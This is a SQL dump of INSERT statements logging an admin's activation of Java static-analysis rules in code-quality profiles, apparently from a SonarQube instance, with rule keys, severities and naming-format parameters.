INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2326, '2017-11-20 11:14:47.493', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3958;ruleKey=squid:S3958;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0JFbbGRdfPp-rB6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2327, '2017-11-20 11:14:47.556', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3959;ruleKey=squid:S3959;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0KEbbGRdfPp-rB7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2328, '2017-11-20 11:14:47.582', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3972;ruleKey=squid:S3972;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0KdbbGRdfPp-rB8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2329, '2017-11-20 11:14:47.621', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3981;ruleKey=squid:S3981;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0LFbbGRdfPp-rB9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2330, '2017-11-20 11:14:47.661', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3984;ruleKey=squid:S3984;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0LtbbGRdfPp-rB-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2331, '2017-11-20 11:14:47.701', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3985;ruleKey=squid:S3985;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0MVbbGRdfPp-rB_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2332, '2017-11-20 11:14:47.732', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3986;ruleKey=squid:S3986;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0M0bbGRdfPp-rCA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2333, '2017-11-20 11:14:47.761', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S4032;ruleKey=squid:S4032;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0NRbbGRdfPp-rCB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2334, '2017-11-20 11:14:47.799', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S4034;ruleKey=squid:S4034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0N3bbGRdfPp-rCC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2335, '2017-11-20 11:14:47.838', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S4042;ruleKey=squid:S4042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0OebbGRdfPp-rCD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2336, '2017-11-20 11:14:47.874', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S4065;ruleKey=squid:S4065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0PCbbGRdfPp-rCE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2337, '2017-11-20 11:14:47.911', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S4087;ruleKey=squid:S4087;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0PnbbGRdfPp-rCF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2338, '2017-11-20 11:14:47.954', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S4143;ruleKey=squid:S4143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0QSbbGRdfPp-rCG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2339, '2017-11-20 11:14:48.004', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S4144;ruleKey=squid:S4144;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0REbbGRdfPp-rCH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2340, '2017-11-20 11:14:48.076', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S4165;ruleKey=squid:S4165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0SMbbGRdfPp-rCI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2341, '2017-11-20 11:14:48.15', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S899;ruleKey=squid:S899;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0TWbbGRdfPp-rCJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2342, '2017-11-20 11:14:48.235', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0UrbbGRdfPp-rCK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2343, '2017-11-20 11:14:48.387', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0XDbbGRdfPp-rCL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2344, '2017-11-20 11:14:48.407', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0XXbbGRdfPp-rCM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2345, '2017-11-20 11:14:48.425', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0XpbbGRdfPp-rCN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2346, '2017-11-20 12:16:58.684', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDE8bbGRdfPp-rCO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2347, '2017-11-20 12:16:58.734', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDFubbGRdfPp-rCP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2348, '2017-11-20 12:16:58.768', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDGPbbGRdfPp-rCQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2349, '2017-11-20 12:16:58.811', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDG7bbGRdfPp-rCR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2350, '2017-11-20 12:16:58.87', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDH2bbGRdfPp-rCS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2351, '2017-11-20 12:16:58.927', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDIvbbGRdfPp-rCT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2352, '2017-11-20 12:16:58.975', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDJfbbGRdfPp-rCU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2353, '2017-11-20 12:16:59.01', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDKCbbGRdfPp-rCV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2354, '2017-11-20 12:16:59.042', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDKibbGRdfPp-rCW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2355, '2017-11-20 12:16:59.065', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDK5bbGRdfPp-rCX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2356, '2017-11-20 12:16:59.097', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDLZbbGRdfPp-rCY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2357, '2017-11-20 12:16:59.135', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDL_bbGRdfPp-rCZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2358, '2017-11-20 12:16:59.159', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDMXbbGRdfPp-rCa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2359, '2017-11-20 12:16:59.203', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDNDbbGRdfPp-rCb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2360, '2017-11-20 12:16:59.247', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDNvbbGRdfPp-rCc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2361, '2017-11-20 12:16:59.286', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDOWbbGRdfPp-rCd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2362, '2017-11-20 12:16:59.362', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S00100;ruleKey=squid:S00100;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDPibbGRdfPp-rCe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2363, '2017-11-20 12:16:59.456', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S00101;ruleKey=squid:S00101;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDRAbbGRdfPp-rCf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2364, '2017-11-20 12:16:59.531', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S00107;ruleKey=squid:S00107;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDSLbbGRdfPp-rCg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2365, '2017-11-20 12:16:59.574', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S00108;ruleKey=squid:S00108;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDS2bbGRdfPp-rCh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2366, '2017-11-20 12:16:59.633', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S00112;ruleKey=squid:S00112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDTxbbGRdfPp-rCi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2367, '2017-11-20 12:16:59.687', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S00114;ruleKey=squid:S00114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDUnbbGRdfPp-rCj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2368, '2017-11-20 12:16:59.725', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S00115;ruleKey=squid:S00115;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDVNbbGRdfPp-rCk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2369, '2017-11-20 12:16:59.758', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S00116;ruleKey=squid:S00116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDVubbGRdfPp-rCl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2370, '2017-11-20 12:16:59.79', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S00117;ruleKey=squid:S00117;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDWObbGRdfPp-rCm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2371, '2017-11-20 12:16:59.825', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S00119;ruleKey=squid:S00119;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDWxbbGRdfPp-rCn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2372, '2017-11-20 12:16:59.854', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S00120;ruleKey=squid:S00120;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDXNbbGRdfPp-rCo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2373, '2017-11-20 12:16:59.895', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S106;ruleKey=squid:S106;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDX3bbGRdfPp-rCp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2374, '2017-11-20 12:16:59.919', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1065;ruleKey=squid:S1065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDYPbbGRdfPp-rCq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2375, '2017-11-20 12:16:59.939', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1066;ruleKey=squid:S1066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDYjbbGRdfPp-rCr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2376, '2017-11-20 12:16:59.953', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1068;ruleKey=squid:S1068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDYxbbGRdfPp-rCs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2377, '2017-11-20 12:16:59.99', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1075;ruleKey=squid:S1075;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDZWbbGRdfPp-rCt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2378, '2017-11-20 12:17:00.016', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1118;ruleKey=squid:S1118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDZwbbGRdfPp-rCu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2379, '2017-11-20 12:17:00.031', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1125;ruleKey=squid:S1125;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDZ_bbGRdfPp-rCv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2380, '2017-11-20 12:17:00.075', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1126;ruleKey=squid:S1126;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDarbbGRdfPp-rCw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2381, '2017-11-20 12:17:00.09', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1133;ruleKey=squid:S1133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDa6bbGRdfPp-rCx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2382, '2017-11-20 12:17:00.108', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1134;ruleKey=squid:S1134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDbMbbGRdfPp-rCy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2383, '2017-11-20 12:17:00.127', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1135;ruleKey=squid:S1135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDbfbbGRdfPp-rCz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2384, '2017-11-20 12:17:00.159', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1141;ruleKey=squid:S1141;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDb_bbGRdfPp-rC0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2385, '2017-11-20 12:17:00.245', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1143;ruleKey=squid:S1143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDdVbbGRdfPp-rC1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2386, '2017-11-20 12:17:00.293', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1148;ruleKey=squid:S1148;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDeFbbGRdfPp-rC2');
